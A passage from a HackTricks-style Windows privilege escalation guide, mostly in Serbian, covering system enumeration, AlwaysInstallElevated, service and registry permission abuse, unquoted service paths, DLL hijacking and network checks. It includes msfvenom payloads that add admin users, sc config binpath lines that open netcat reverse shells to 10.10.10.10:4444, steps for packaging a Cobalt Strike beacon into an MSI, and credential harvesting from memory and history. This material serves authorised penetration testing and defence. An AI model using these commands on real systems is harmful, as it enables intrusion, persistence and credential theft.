# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Osnovna Windows teorija

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows-u, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

U Windows-u postoje različite stvari koje bi mogle **sprečiti vas u enumerisanju sistema**, pokretanju izvršnih fajlova ili čak **otkriti vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **defense** **mechanisms** pre nego što započnete privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je zgodan za pretraživanje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **massive attack surface** koje Windows okruženje ima.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Ima li bilo kakvih credential/Juicy info sačuvanih u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Istorija PowerShell-a
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript fajlovi

Možete saznati kako to uključiti na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, pratite uputstva u odeljku "Transcript files" dokumentacije, birajući **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste prikazali poslednjih 15 događaja iz PowersShell logs možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Snimljen je potpuni zapis aktivnosti i celog sadržaja izvršavanja skripte, osiguravajući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan revizorski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pružaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Događaji za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Za prikaz poslednjih 20 događaja možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Podešavanja interneta
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Pogoni
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sistem možete kompromitovati ako se ažuriranja ne zahtevaju koristeći http**S**, već http.

Počinjete proverom da li mreža koristi non-SSL WSUS za ažuriranja tako što ćete pokrenuti sledeće u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell-u:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao jedan od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Onda je **eksploatabilno.** Ako je poslednji registry jednak 0, tada će WSUS unos biti ignorisan.

Da biste iskoristili ovu ranjivost možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ovo su MiTM weaponized exploits skripte za ubacivanje 'lažnih' ažuriranja u non-SSL WSUS saobraćaj.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U suštini, ovo je propust koji ovaj bug iskorišćava:

> Ako imamo mogućnost da izmenimo lokalni proxy korisnika, i Windows Updates koristi proxy konfigurisan u Internet Explorer podešavanjima, tada imamo mogućnost da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) lokalno da presretnemo sopstveni saobraćaj i pokrenemo kod kao povišeni korisnik na našem sistemu.
>
> Štaviše, pošto WSUS servis koristi podešavanja trenutnog korisnika, koristiće i njegov certificate store. Ako generišemo self-signed certificate za WSUS hostname i dodamo taj sertifikat u certificate store trenutnog korisnika, bićemo u mogućnosti da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi HSTS-like mehanizme za implementaciju trust-on-first-use tip validacije sertifikata. Ako je predstavljen sertifikat pouzdan od strane korisnika i ima ispravan hostname, biće prihvaćen od strane servisa.

Možete iskoristiti ovu ranjivost koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kad bude dostupan).

## KrbRelayUp

Postoji **local privilege escalation** ranjivost u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja gde **LDAP signing is not enforced**, korisnici imaju **self-rights** koji im dopuštaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)**, i mogućnost da korisnici kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni korišćenjem **default settings**.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** ova 2 registra su **omogućena** (vrednost je **0x1**), onda korisnici bilo kog privilegija mogu **instalirati** (izvršavati) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript kreira prethodno kompajlirani MSI installer koji traži dodavanje korisnika/grupe (dakle biće vam potreban GIU pristup):
```
Write-UserAddMSI
```
Samo izvršite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorijal da naučite kako kreirati MSI wrapper koristeći ove alate. Imajte na umu da možete wrap-ovati "**.bat**" fajl ako želite samo da **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generišite** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i upišite "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
- Dajte projektu ime, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Nastavite da klikćete **Next** dok ne dođete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti instaliranu aplikaciju legitimnijom.
- Kliknite desnim tasterom na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se installer pokrene.
- U okviru **Custom Action Properties**, promenite **Run64Bit** na **True**.
- Na kraju, **build it**.
- Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, uverite se da ste podesili platformu na x64.

### MSI Installation

Da biste izvršili **installation** zlonamernog `.msi` fajla u pozadini:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Za iskorišćavanje ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja audita

Ova podešavanja određuju šta je **logged**, zato obratite pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — korisno je znati gde se šalju logovi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za upravljanje lozinkama lokalnog Administrator naloga, obezbeđujući da je svaka lozinka jedinstvena, nasumična i redovno ažurirana na računarima pridruženim domenu. Ove lozinke se sigurno čuvaju u Active Directory i mogu im pristupiti samo korisnici kojima su dodeljena odgovarajuća ovlašćenja putem ACLs, što im omogućava da pregledaju lokalne admin lozinke ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **plain-text passwords su pohranjene u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od Windows 8.1, Microsoft je uveo pojačanu zaštitu za Local Security Authority (LSA) kako bi blokirao pokušaje nepouzdanih procesa da read its memory ili inject code, dodatno osiguravajući sistem.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti credentials koji su pohranjeni na uređaju od pretnji poput pass-the-hash napada.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** se autentifikuju od strane **Local Security Authority** (LSA) i koriste se od strane komponenti operativnog sistema. Kada se korisnikovi podaci za prijavu autentifikuju od strane registrovanog sigurnosnog paketa, obično se uspostavljaju Domain credentials za tog korisnika.\
[**Više informacija o Cached Credentials ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i Grupe

### Enumeracija korisnika i grupa

Proverite da li neke od grupa kojima pripadate imaju zanimljive dozvole.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte o privilegovanim grupama i kako ih zloupotrebiti da biste eskalirali privilegije ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali o interesantnim tokens** i kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sessions
```bash
qwinsta
klist sessions
```
### Kućni direktorijumi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Preuzmi sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole fajlova i foldera

Prvo i najvažnije, pri listanju procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **prepisati neki pokrenuti binarni fajl** ili da li imate dozvole za pisanje u folderu binarnog fajla kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proveri da li su prisutni [**electron/cef/chromium debuggers** koji se pokreću, možeš ih zloupotrebiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Možete kreirati memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi kao što je FTP često imaju **credentials in clear text in memory** — pokušajte da napravite memory dump i pročitate credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu dozvoliti korisniku da pokrene CMD ili pretražuje direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Dobijte listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se imati binarni fajl **accesschk** iz _Sysinternals_ kako biste proverili potreban nivo privilegija za svaki servis.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se proveriti da li "Authenticated Users" mogu izmeniti bilo koju uslugu:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako imate ovu grešku (na primer sa SSDPSRV):

_Dogodila se sistemska greška 1058._\
_Servis se ne može pokrenuti, ili zato što je onemogućen ili zato što nema pridruženih omogućenih uređaja._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Još jedno rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmeni putanju binarne datoteke servisa**

U scenariju gde grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i pokrenuli **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što može dovesti do mogućnosti promene konfiguracija servisa.
- **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracija servisa.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**Proverite da li možete izmeniti binarni fajl koji se izvršava od strane servisa** ili da li imate **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Takođe možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra servisa

Treba da proverite da li možete da izmenite bilo koji registar servisa.\
Možete da **proverite** svoje **dozvole** nad registrom **servisa** na sledeći način:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako da, binarni fajl koji servis izvršava može biti izmenjen.

Da biste promenili putanju izvršavanog binarnog fajla:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registar servisa AppendData/AddSubdirectory dozvole

Ako imate ovu dozvolu nad registrom, to znači da **možete kreirati podregistre iz ovog**. U slučaju Windows services, ovo je **dovoljno da se izvrši proizvoljan kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje servisa bez navodnika

Ako putanja do izvršne datoteke nije u navodnicima, Windows će pokušati da izvrši svaki deo pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Navedite sve putanje servisa bez navodnika, izuzimajući one koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete detektovati i iskoristiti** ovu ranjivost pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati servisni binarni fajl pomoću metasploit-a:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se preduzeti ako neki servis zakaže. Ova funkcija se može konfigurisati tako da pokazuje na binary. Ako se taj binary može zameniti, privilege escalation može biti moguć. Više detalja možete pronaći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacije

### Instalirane aplikacije

Proverite **permissions of the binaries** (možda možete overwrite-ovati neki i escalate privileges) i **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proverite da li možete izmeniti neki config fajl da biste pročitali neki specijalan fajl ili da li možete izmeniti neki binarni fajl koji će biti izvršen od strane Administrator naloga (schedtasks).

Jedan način da pronađete slabe dozvole foldera/fajlova u sistemu je izvršavanje:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Pokretanje pri startu

**Proverite da li možete prepisati neki registry ili binary koji će biti izvršen od strane drugog korisnika.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ako driver izlaže proizvoljan kernel read/write primitive (uobičajeno u loše dizajniranim IOCTL handlers), možete eskalirati tako što ćete ukrasti SYSTEM token direktno iz kernel memorije. Pogledajte korak-po-korak tehniku ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar foldera koji se nalazi u PATH** mogli biste biti u mogućnosti da hijackujete DLL koju učitava proces i **eskalirate privilegije**.

Proverite dozvole svih foldera unutar PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako zloupotrebiti ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Mreža

### Deljeni resursi
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li su drugi poznati računari hardcoded u hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proverite **ograničene servise** dostupne iz spoljašnjosti.
```bash
netstat -ano #Opened ports?
```
### Tabela rutiranja
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
